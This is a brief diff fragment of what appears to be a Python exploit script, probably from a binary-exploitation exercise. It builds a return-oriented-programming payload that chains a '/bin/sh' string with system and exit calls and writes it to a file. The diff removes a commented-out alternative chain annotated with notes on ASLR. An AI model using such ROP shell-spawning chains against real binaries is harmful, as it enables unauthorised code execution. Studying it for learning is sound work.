@@ -70,15 +70,6 @@ payload = (
     + bin_sh_string
     + system_call
     + exit_call
-
-    # + rop_pop_rdi_ret
-    # + puts_got
-    # + rop_puts  # works with aslr.
-    # + flush_got
-    # + rop_pop_rdi_ret  # works with aslr.
-    # + bin_sh_string  # broken by aslr.
-    # + system_call  # broken by aslr.
-    # + exit_call  # broken by aslr.
 )
 
 f = open("payload", "wb")
